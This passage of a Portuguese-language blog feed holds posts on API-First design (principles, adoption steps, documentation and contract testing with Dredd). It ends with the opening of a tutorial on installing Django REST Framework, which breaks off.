&lt;p&gt;Ao fim do desenvolvimento, não esqueça de executar o &lt;em&gt;Dredd&lt;/em&gt; apontando para o serviço &lt;em&gt;Django&lt;/em&gt;. Aliás, colocar essa checagem em um &lt;em&gt;CI&lt;/em&gt; é uma excelente ideia! Dependendo do seu &lt;em&gt;release train&lt;/em&gt;, a falha dessa checagem pode inclusive bloquear o seu
&lt;em&gt;Continuous Delivery&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;6: Opere e engage&lt;/h2&gt;
&lt;p&gt;A sua funcionalidade está pronta. O seu produto está documentado. Agora é hora de "ir para a rua".&lt;/p&gt;
&lt;p&gt;Com essa ideia de "uma &lt;em&gt;API&lt;/em&gt; para todos governar", fica mais fácil ser adepto da corrente do "eat your own dog food". Tendo
outros times da sua própria organização como usuários fica mais fácil coletar &lt;em&gt;feedbacks&lt;/em&gt; e reiniciar todo o processo
descrito com novas demandas e possíveis correções.&lt;/p&gt;
&lt;p&gt;Para terceiros, é fundamental tratar a &lt;em&gt;API&lt;/em&gt; como parte do negócio, e ela (e sua documentação) precisa ter espaço de destaque no &lt;em&gt;website&lt;/em&gt; da sua empresa. O &lt;a href="https://www.twilio.com/" title="Communication APIs for SMS, Voice and Video"&gt;&lt;em&gt;Twillio&lt;/em&gt;&lt;/a&gt; faz isso
muito bem:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/api-first-engage.png" width="740" height="198" title="Exemplo de exposição de documentação" alt="Exemplo de exposição de documentação"&gt;&lt;/p&gt;
&lt;p&gt;Além disso, existem &lt;em&gt;marketplaces&lt;/em&gt; de &lt;em&gt;APIs&lt;/em&gt; espalhados pela &lt;em&gt;web&lt;/em&gt; que podem servir como canal de propaganda da sua &lt;em&gt;API&lt;/em&gt;. O &lt;a href="https://rapidapi.com/" title="Find and Connect to Thousands of APIs"&gt;RapidAPI&lt;/a&gt; é um bom exemplo de plataforma para conectar-se
com possíveis consumidores.&lt;/p&gt;
&lt;p&gt;Não esqueça que propiciar &lt;em&gt;SDKs&lt;/em&gt; para os seus consumidores faz parte dessa etapa. Não basta apenas escrevermos o &lt;em&gt;backend&lt;/em&gt;,
precisamos nos engajar em escrever clientes para diferentes linguagens. O &lt;a href="https://swagger.io/tools/swagger-codegen/" title="Generate server stubs and client SDKs for any API"&gt;&lt;em&gt;Swagger Codegen&lt;/em&gt;&lt;/a&gt; pode ajudar nessa tarefa, gerando &lt;em&gt;SDKs&lt;/em&gt;
a partir da especificação da sua &lt;em&gt;API&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Abordamos o processo, os passos, e quais ferramentas podemos utilizar para atender os requisitos necessários
em cada etapa. Faltou abordar de forma prática como "colocar isso tudo junto para funcionar". O &lt;em&gt;post&lt;/em&gt;
ficou gigante, e possivelmente abordaremos em uma parte 2 como colocar isso tudo em um &lt;em&gt;CI&lt;/em&gt;, e em como
orquestrar &lt;em&gt;release&lt;/em&gt; de especificação e &lt;em&gt;deploy&lt;/em&gt; de aplicação.&lt;/p&gt;
&lt;p&gt;Há uma pluralidade interessante de ferramentas e serviços que giram em torno do conceito de &lt;em&gt;API-First&lt;/em&gt;. Se
por um lado isso pode significar aumentar a complexidade do seu processo de desenvolvimento, por outro é
também uma certa garantia de que existem outros &lt;em&gt;players&lt;/em&gt; investindo nessa prática, e que se você tem na sua
&lt;em&gt;API&lt;/em&gt; o seu principal produto, talvez ficar por fora possa ocasionar um problema de estratégia.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dredd.org/en/latest/index.html"&gt;Dredd - HTTP API Testing Framework&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openapi.tools/"&gt;OpenAPI.Tools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.programmableweb.com/news/how-to-design-great-apis-api-first-design-and-raml/how-to/2015/07/10"&gt;ProgrammableWeb - How To Design Great APIs With API-First Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stoplight.io/p/docs/gh/stoplightio/prism"&gt;Stoplightio - Prism&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/trimble-maps-engineering-blog/api-first-development-and-openapi-835afb46b7f1"&gt;Trimble MAPS Engineering Blog - API-First Development and OpenAPI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="prism"></category><category term="dredd"></category><category term="apis"></category><category term="api-first"></category><category term="swagger"></category><category term="drf"></category><category term="oai"></category></entry><entry><title>O API-First</title><link href="https://klauslaube.com.br/2020/02/21/o-api-first.html" rel="alternate"></link><published>2020-02-21T09:15:00-03:00</published><updated>2020-02-21T09:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-02-21:/2020/02/21/o-api-first.html</id><summary type="html">&lt;p&gt;Tratar &lt;em&gt;APIs&lt;/em&gt; como "first-class citizens" pode ser um desafio e tanto, principalmente quando estamos em um contexto
de entrega rápida ou de prova de conceito. Como desenvolvedor, admito que priorizo resolver a lógica de negócio
escrevendo código, do que discutindo contratos ou requisitos não funcionais.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Code-First&lt;/h2&gt;
&lt;p&gt;O modelo de trabalho …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tratar &lt;em&gt;APIs&lt;/em&gt; como "first-class citizens" pode ser um desafio e tanto, principalmente quando estamos em um contexto
de entrega rápida ou de prova de conceito. Como desenvolvedor, admito que priorizo resolver a lógica de negócio
escrevendo código, do que discutindo contratos ou requisitos não funcionais.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Code-First&lt;/h2&gt;
&lt;p&gt;O modelo de trabalho ilustrado acima pode ser conhecido por "bottom up", "code first", ou apenas por "aquela forma que a gente
geralmente utiliza em nossos projetos". Onde focamos primeiro no código, e
deixamos para depois questões relacionadas à integração dos componentes.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Kirsten Hunter&lt;/em&gt; &lt;a href="https://www.programmableweb.com/news/introduction-to-api-first-design/analysis/2016/10/31" title="Introduction to API-First Design"&gt;ilustra bem os efeitos colaterais de tal prática&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;APIs are created as an afterthought once the product has already been created as a tightly coupled system, with the frontend website and backend system entwined together in a highly codependent way and the REST API having to be ‘shoe-horned’ into this system as a separate entity.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Não há nada fundamentalmente errado com essa dinâmica (inclusive, &lt;a href="https://www.youtube.com/watch?v=Tb823aqgX_0" title="Bottom Up vs Top Down Design in Clojure"&gt;há opiniões a favor desse conceito&lt;/a&gt;), mas com o mundo
cada vez mais "microservices-driven", pensar primeiramente na interface e em quem irá usá-la pode antecipar problemas, diminuir riscos e definir contratos mais sólidos.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/captain-ux.jpg" width="640" height="320" title="Não faça o dev ser merecedor para utilizar a sua API (comicbookmovie.com)" alt="Não faça o dev ser merecedor para utilizar a sua API (comicbookmovie.com)"&gt;&lt;/p&gt;
&lt;p&gt;Não é raro escutarmos em pleno 2020 histórias sobre times distintos trabalhando em uma grande solução, que quando
colocaram seus serviços para funcionar juntos, descobriram uma série de problemas de integração (ou até mesmo que eles
simplesmente não resolviam o problema).&lt;/p&gt;
&lt;h2&gt;O que é API-First?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;API-First&lt;/em&gt; pode ser grosseiramente resumido em "trate APIs como first-class citizens".&lt;/p&gt;
&lt;p&gt;Em outras palavras, a proposta é que &lt;em&gt;APIs&lt;/em&gt; sejam consideradas partes fundamentais
do ecossistema de um produto, devem ser parte de sua estratégia e construção,
e não apenas um "extra" ou um "side product".&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;DZone&lt;/em&gt; define &lt;em&gt;API-First&lt;/em&gt; da &lt;a href="https://dzone.com/articles/an-api-first-development-approach-1" title="An API-First Development Approach"&gt;seguinte forma&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) is a strategy in which the first order of business is to develop an API that puts your target developer’s interests first and then build the product on top of it (be it a website, mobile application, or a SaaS software). By building on top of APIs with developers in mind, you and your developers are saving a lot of work while laying down the foundations for others to build on.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Elas devem ser tão cruciais quanto usuários são em estratégias &lt;em&gt;user-centric&lt;/em&gt; e a experiência
&lt;em&gt;mobile&lt;/em&gt; é em um &lt;em&gt;approach&lt;/em&gt; &lt;em&gt;mobile-first&lt;/em&gt;. Utilizar uma abordagem &lt;em&gt;api-centric&lt;/em&gt;
fará com que o &lt;em&gt;design&lt;/em&gt; funcione de uma ótica diferente (possibilitando maior cuidado em relação
a consistência e reuso), e que o negócio gire em torno do contrato que está sendo definido (ocasionando
maior interação com outros &lt;em&gt;stakeholders&lt;/em&gt; de forma antecipada, dentro do tempo de vida de desenvolvimento).&lt;/p&gt;
&lt;h3&gt;API-centric == Developer Experience&lt;/h3&gt;
&lt;p&gt;E se pararmos para analisar friamente o que essa ideia significa, ser &lt;em&gt;api-centric&lt;/em&gt; é no fim das contas ser &lt;em&gt;user-centric&lt;/em&gt; (ou &lt;em&gt;customer-centric&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/thor-ux.png" width="740" height="309" title="Não duvide da vontade do seu usuário. Ele vai descobrir um jeito de levantar o martelo (ibtimes.com)" alt="Não duvide da vontade do seu usuário. Ele vai descobrir um jeito de levantar o martelo (ibtimes.com)"&gt;&lt;/p&gt;
&lt;p&gt;O usuário nesse caso passa a ser outro desenvolvedor (do mesmo time, da mesma empresa, ou de terceiros), portanto,
&lt;em&gt;Developer eXperience&lt;/em&gt; também é parte fundamental dessa estratégia, e vem embutida em sua prática, como ilustra o &lt;a href="https://swagger.io/resources/articles/adopting-an-api-first-approach/" title="Leia mais no Swagger.io"&gt;"Understanding the API-First Approach to Building Products"&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Consumers of APIs are most often developers, and developer experience (DX) can make or break the success of an API. API first ensures that developers have positive experiences using your APIs. Well-designed, well-documented, consistent APIs provide positive developer experiences because it’s easier to reuse code and onboard developers, and it reduces the learning curve.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Os 3 princípios&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Lars Trieloff&lt;/em&gt;, no &lt;a href="https://medium.com/adobetech" title="Leia o blog de tecnologia da Adobe"&gt;&lt;em&gt;Adobe Tech Blog&lt;/em&gt;&lt;/a&gt;, escreve sobre
&lt;a href="https://medium.com/adobetech/three-principles-of-api-first-design-fa6666d9f694" title="Veja mais no Adobe Tech Blog"&gt;três princípios fundamentais para o sucesso da prática&lt;/a&gt;,
que acredito serem essenciais para compreender a real motivação por trás da ideia.&lt;/p&gt;
&lt;h3&gt;1. Your API is the first user interface of your application&lt;/h3&gt;
&lt;p&gt;Vale estressar esse ponto: Pessoas utilizando a sua &lt;em&gt;API&lt;/em&gt; são os seus usuários, e a sua &lt;em&gt;API&lt;/em&gt; precisa ser projetada com
esses usuários em mente.&lt;/p&gt;
&lt;p&gt;Partindo do princípio que a &lt;em&gt;API&lt;/em&gt; é o caminho mais importante de interação com o seu produto, isso significa que ela
deve ter um investimento de tempo equivalente (ou superior) ao tempo investido no desenvolvimento de (por exemplo) interfaces
gráficas.&lt;/p&gt;
&lt;h3&gt;2. Your API comes first, then the implementation&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Your implementation will change frequently, your API should not.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sua &lt;em&gt;API&lt;/em&gt; se torna um contrato que servirá como especificação para a implementação, portanto, o ideal é pensarmos como
duas coisas separadas. Conforme a sua aplicação for evoluindo é muito provável que a sua implementação mude, mas o
contrato deve (dentro do possível) manter-se o mesmo.&lt;/p&gt;
&lt;h3&gt;3. Your API is described (and maybe even self-descriptive)&lt;/h3&gt;
&lt;p&gt;Sua &lt;em&gt;API&lt;/em&gt; precisa ser compreendida por pessoas que não estavam envolvidas em seu desenvolvimento. E aqui é difícil
escaparmos da necessidade de documentação.&lt;/p&gt;
&lt;p&gt;E por documentação, é impossível deixar de questionar todo o esforço envolvido em ter uma documentação válida, atualizada,
e que deveras é usável. Ferramentas estão disponíveis, e existem diferentes formas de automatizar esse processo. Tais
ferramentas servem não somente para a criação de documentação, mas também da especificação em si (que pode ser
também consumida por uma máquina). Por exemplo, &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://klauslaube.com.br/tag/swagger.html" title="Leia mais sobre Swagger"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt;, já abordados no &lt;em&gt;blog&lt;/em&gt;, são excelentes iniciativas para
resolver essa questão.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/thor-ux-2.jpg" width="597" height="300" title="Se o Thor tivesse uma documentação bacanuda para como funciona o martelo, Caps teria usado antes (cinemablend.com)" alt="Se o Thor tivesse uma documentação bacanuda para como funciona o martelo, Caps teria usado antes (cinemablend.com)"&gt;&lt;/p&gt;
&lt;p&gt;Mas além disso, seguir padrões é outro esforço que trará resultados na usabilidade da &lt;em&gt;API&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When it comes to documentation for APIs, structured documentation beats unstructured documentation. Following a standard pattern for URLs, resource types, request methods, headers, request parameters, and response formats will make it easier to explore and understand functionality, and reduces surprises when your API grows.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Hypermedia&lt;/em&gt; parece outra excelente ideia, uma vez que serve como documentação e oferece meios para
humanos e máquinas compreenderem melhor a sua funcionalidade.&lt;/p&gt;
&lt;h2&gt;Camadas: API-First Development x API-First Design&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;API-First&lt;/em&gt; é sobre fazer a &lt;em&gt;API&lt;/em&gt; antes da interface &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; e &lt;em&gt;mobile&lt;/em&gt;? Ou
seria sobre primeiro fazer o &lt;em&gt;design&lt;/em&gt; da &lt;em&gt;API&lt;/em&gt; e a partir daí passar para a implementação?&lt;/p&gt;
&lt;p&gt;Uma ótica interessante sobre esse debate pode ser lida no &lt;a href="https://apievangelist.com/2014/08/11/what-is-an-api-first-strategy-adding-some-dimensions-to-this-new-question/" title="Leia mais no API Evangelist"&gt;"What Is An API First Strategy? Adding Some Dimensions To This New Question"&lt;/a&gt;, do &lt;em&gt;apievangelist.com&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Durante a pesquisa para a escrita desse &lt;em&gt;post&lt;/em&gt;, fui exposto a diferentes perspectivas, e é muito provável que eu
tenha apresentado elas de forma "misturada" até aqui:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Do ponto de vista de negócio, é sobre ter uma &lt;em&gt;API&lt;/em&gt; primeiro e torná-la um produto &lt;em&gt;per se&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Do ponto de vista de tecnologia, é sobre ter uma plataforma primeiro;&lt;/li&gt;
&lt;li&gt;Do ponto de vista de arquitetura, é sobre ter um &lt;em&gt;design&lt;/em&gt; coeso, reusável, e construído através da colaboração de diferentes &lt;em&gt;stakeholders&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Do ponto de vista de &lt;em&gt;UX&lt;/em&gt;, é sobre ter uma &lt;em&gt;API&lt;/em&gt; bem estruturada e documentada;&lt;/li&gt;
&lt;li&gt;Do ponto de vista do desenvolvedor, é sobre ter uma especificação antes de partir para a implementação.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Qual visão você pretende adotar depende muito do contexto. Haverá casos em que o produto já existe,
soluções já estão no ar, e você fará o movimento para um consumo baseado em &lt;em&gt;APIs&lt;/em&gt;. Ou, com sorte, você fundará
uma &lt;em&gt;startup&lt;/em&gt; e terá controle o suficiente para primeiramente produzir uma &lt;em&gt;API&lt;/em&gt; e depois as interfaces gráficas.&lt;/p&gt;
&lt;p&gt;Assim como há diferentes "níveis de &lt;em&gt;REST&lt;/em&gt;" que podemos usar no cotidiano, &lt;em&gt;API-First&lt;/em&gt; pode ser adotado em diferentes níveis
e maneiras.&lt;/p&gt;
&lt;p&gt;No meu caso, que atualmente trabalho em um ambiente &lt;em&gt;enterprise&lt;/em&gt; e tenho pouca influência sobre o negócio, é basicamente
sobre &lt;a href="https://en.wikipedia.org/wiki/Design_by_contract" title="Design by contract"&gt;discutir o contrato primeiro&lt;/a&gt;, e ter uma especificação que sirva como documentação e que guie o meu desenvolvimento.&lt;/p&gt;
&lt;h2&gt;Os passos&lt;/h2&gt;
&lt;p&gt;Na primeira vez que ouvi falar sobre esse conceito, me perguntei como que de forma prática é possível exercitá-lo. De
lá para cá já me deparei com diferentes formas e processos para adoção.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/captain-ux-2.jpg" width="740" height="416" title="Ver outro dev usando sua API é tão sensacional quanto o Caps usando o martelo (youtube.com)" alt="Ver outro dev usando sua API é tão sensacional quanto o Caps usando o martelo (youtube.com)"&gt;&lt;/p&gt;
&lt;p&gt;Inclusive, durante meu período na &lt;a href="https://loadsmart.com/#/" title="Book a truck in seconds"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;, cheguei a
falar exatamente sobre isso em um
&lt;a href="https://www.slideshare.net/kplaube/api-first-design" title="Veja os slides da apresentação API First Design: Insights from the real-life usage"&gt;&lt;em&gt;lightning talk&lt;/em&gt; na &lt;em&gt;Python Sul&lt;/em&gt;&lt;/a&gt;, e sobre como estávamos montando esse processo.&lt;/p&gt;
&lt;p&gt;O contexto pode variar de acordo com o público alvo de sua &lt;em&gt;API&lt;/em&gt;. Por exemplo, no artigo &lt;a href="https://swagger.io/resources/articles/adopting-an-api-first-approach/"&gt;"Understanding the API-First Approach to Building Products"&lt;/a&gt; do &lt;em&gt;swagger.io&lt;/em&gt;, há uma boa descrição do que &lt;strong&gt;não&lt;/strong&gt; pode faltar quando o assunto é prover &lt;em&gt;APIs&lt;/em&gt; dentro de uma organização:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Brainstorm:&lt;/strong&gt; Primeiro identifique os serviços chave do negócio e suas &lt;em&gt;capabilities&lt;/em&gt;. Descubra quais tipos de &lt;em&gt;APIs&lt;/em&gt;
  deveriam ser oferecidas, descreva os casos de uso para tais &lt;em&gt;APIs&lt;/em&gt;, e aponte potenciais &lt;em&gt;endpoints&lt;/em&gt; baseados nesses casos
  de uso.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Identifique os stakeholders:&lt;/strong&gt; Quem são os potenciais usuários dentro da sua organização? Tente construir uma visão
  clara e compartilhada com os demais times da sua empresa. Permita que &lt;em&gt;stakeholders&lt;/em&gt; influenciem no &lt;em&gt;design&lt;/em&gt; da &lt;em&gt;API&lt;/em&gt; e
  envolva-os em melhorias e mudanças.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Projete um contrato:&lt;/strong&gt; O contrato estabelecerá uma série de padrões e boas práticas. Descreva todas as &lt;em&gt;APIs&lt;/em&gt; e garanta
  que elas funcionarão de acordo com o acordado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Crie um style guide:&lt;/strong&gt; Com um &lt;em&gt;style guide&lt;/em&gt; será possível ter consistência entre diferentes times e serviços, dentro
  de uma mesma organização. &lt;em&gt;Status codes&lt;/em&gt;, versionamento, erros, padrões de rota, etc. Possuir uma especificação comum reduzirá o atrito para adoção de sua &lt;em&gt;API&lt;/em&gt; por outros desenvolvedores da organização.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Implemente governança:&lt;/strong&gt; Isso ajudará a estabelecer padrões e reforçar &lt;em&gt;outcomes&lt;/em&gt; esperados. Essa prática pode envolver
  de &lt;em&gt;code reviews&lt;/em&gt; a &lt;a href="https://www.mabl.com/blog/understanding-contract-testing-microservices-mabl" title="Understanding Contract Testing for Microservices"&gt;&lt;em&gt;contract tests&lt;/em&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Automatize processos:&lt;/strong&gt; Utilize ferramentas para automatizar o processo de geração da documentação de &lt;em&gt;API&lt;/em&gt;, validação
  de estilo, &lt;em&gt;mocking&lt;/em&gt;, versionamento, etc. Prover todo o ferramental necessário para que o usuário possa interagir com sua
  &lt;em&gt;API&lt;/em&gt; facilmente faz parte desse passo.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Controle o seu portfolio de APIs:&lt;/strong&gt; Não é raro esquecermos que certo serviço já existe, portanto, possuir um sistema
  que auxilie no gerenciamento e &lt;em&gt;tracking&lt;/em&gt; de &lt;em&gt;APIs&lt;/em&gt; é fundamental.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Crie um portal para desenvolvedores internos:&lt;/strong&gt; Tenha um lugar centralizado onde usuários possam encontrar a documentação,
  especificação e demais contratos. &lt;em&gt;Developer Experience&lt;/em&gt; é importante.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Muitos desses passos, mesmo em um contexto onde você esteja provendo &lt;em&gt;APIs&lt;/em&gt; para usuários externos, fazem completo sentido
  (e provavelmente já façam parte da fase de arquitetura e &lt;em&gt;design&lt;/em&gt; do seu produto). Possuir um portal no qual você exponha
  as suas &lt;em&gt;APIs&lt;/em&gt;, como elas funcionam e como um possível parceiro é capaz de integrar-se a ela, não são apenas artefatos de
  engenharia, também são possíveis artefatos de negócios.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Se você já pratica &lt;a href="https://en.wikipedia.org/wiki/Design_by_contract &amp;quot;Leia mais no Wikipedia"&gt;&lt;em&gt;design by contract&lt;/em&gt;&lt;/a&gt;,
muito do que foi dito aqui já faz parte do seu cotidiano.&lt;/p&gt;
&lt;p&gt;E com o &lt;em&gt;microservices&lt;/em&gt; fazendo cada vez mais "parte da normalidade", &lt;em&gt;API-First&lt;/em&gt; pode parece mais um &lt;em&gt;buzzword&lt;/em&gt; para descrever
o que já é comum. Ainda assim, não é raro escutarmos histórias sobre dois serviços diferentes que não são
capazes de se comunicar, ou de prestadores de serviço que produzem interfaces gráficas para empresas e que na hora de \
vinculá-las ao &lt;em&gt;back end&lt;/em&gt; a coisa simplesmente não funciona.&lt;/p&gt;
&lt;p&gt;Lembro que o meu primeiro contato com &lt;em&gt;API-First&lt;/em&gt; foi fruto de uma necessidade de expor certa funcionalidade para um certo
grupo de possíveis parceiros. Pensar na &lt;em&gt;API&lt;/em&gt; primeiro foi um exercício interessante, uma vez que envolveu pensar numa
plataforma coesa, e permitiu levar em consideração questões como reuso (que ocasionou na própria empresa utilizando
a &lt;em&gt;API&lt;/em&gt; produzida).&lt;/p&gt;
&lt;p&gt;Lembro também que o &lt;em&gt;feedback&lt;/em&gt; foi muito bom, uma vez que certos mercados possuem uma postura bem conservadora, e pensar
primeiro no usuário mostrou preocupação genuína com o problema do usuário e consequentemente com o produto sendo escrito.&lt;/p&gt;
&lt;p&gt;Contratos são difíceis de serem alterados depois de implementados, então discutí-los antes permite uma resposta mais rápida
(e indolor) à mudanças, além de proporcionar uma possível "paralelidade" entre servidor e consumidor no desenvolvimento da
funcionalidade (reduzindo assim tempo de &lt;em&gt;release&lt;/em&gt; e aumentando a interação durante a implementação do contrato por ambas as partes).&lt;/p&gt;
&lt;p&gt;Por maior que esse &lt;em&gt;post&lt;/em&gt; seja, no fim das contas &lt;em&gt;API-First&lt;/em&gt; é algo fundamentalmente simples, que assim como o &lt;em&gt;agile&lt;/em&gt;,
parte do princípio que as pessoas (e seus problemas) são o que realmente importa.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/adobetech/three-principles-of-api-first-design-fa6666d9f694"&gt;Adobe Tech Blog - Three Principles of API First Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://apievangelist.com/2014/08/11/what-is-an-api-first-strategy-adding-some-dimensions-to-this-new-question/"&gt;API Evangelist - What Is An API First Strategy? Adding Some Dimensions To This New Question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://apifriends.com/api-creation/api-first/"&gt;API Friends - What is an API First definition?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dzone.com/articles/an-api-first-development-approach-1"&gt;DZone - An API-First Development Approach&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dzone.com/articles/what-api-first"&gt;DZone - What is API First?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.programmableweb.com/news/introduction-to-api-first-design/analysis/2016/10/31"&gt;ProgrammableWeb - Introduction to API-First Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://swagger.io/resources/articles/adopting-an-api-first-approach/"&gt;Swagger.io - Understanding the API-First Approach to Building Products&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Design_by_contract"&gt;Wikipedia - Design by contract&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="apis"></category><category term="api-first"></category></entry><entry><title>Construindo APIs em Django com Django REST Framework</title><link href="https://klauslaube.com.br/2020/02/13/construindo-apis-em-django-com-django-rest-framework.html" rel="alternate"></link><published>2020-02-13T06:15:00-03:00</published><updated>2020-02-13T06:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-02-13:/2020/02/13/construindo-apis-em-django-com-django-rest-framework.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html" title="Leia o meu depoimento sobre a rendição ao DRF"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;
tive a oportunidade de "destilar" a minha simpatia pelo &lt;a href="https://klauslaube.com.br/tag/drf.html" title="Leia mais sobre o Django REST Framework"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;,
e de salientar alguns aspectos positivos da ferramenta. A praticidade
é sem dúvida um de seus pontos mais altos, e nesse &lt;em&gt;post&lt;/em&gt; vamos explorá-la através
de código escrito (que vale mais do que mil palavras …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html" title="Leia o meu depoimento sobre a rendição ao DRF"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;
tive a oportunidade de "destilar" a minha simpatia pelo &lt;a href="https://klauslaube.com.br/tag/drf.html" title="Leia mais sobre o Django REST Framework"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;,
e de salientar alguns aspectos positivos da ferramenta. A praticidade
é sem dúvida um de seus pontos mais altos, e nesse &lt;em&gt;post&lt;/em&gt; vamos explorá-la através
de código escrito (que vale mais do que mil palavras).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Instalando&lt;/h2&gt;
&lt;p&gt;Sem mais delongas, o &lt;em&gt;REST Framework&lt;/em&gt; é facilmente instalado através dos comandos &lt;code&gt;pip&lt;/code&gt; ou &lt;code&gt;pipenv&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pipenv install djangorestframework
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não esqueça de adicionar a &lt;em&gt;app&lt;/em&gt; ao seu &lt;code&gt;INSTALLED_APPS&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;

&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;rest_framework&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estamos prontos para mergulhar nos conceitos de &lt;em&gt;routers&lt;/em&gt;, serializadores e &lt;em&gt;views&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Antes de ir: O problema&lt;/h2&gt;
&lt;p&gt;Embora o "iMDB-clone" seja o meu tipo de exemplo favorito, dessa vez vamos imaginar que estamos desenvolvendo
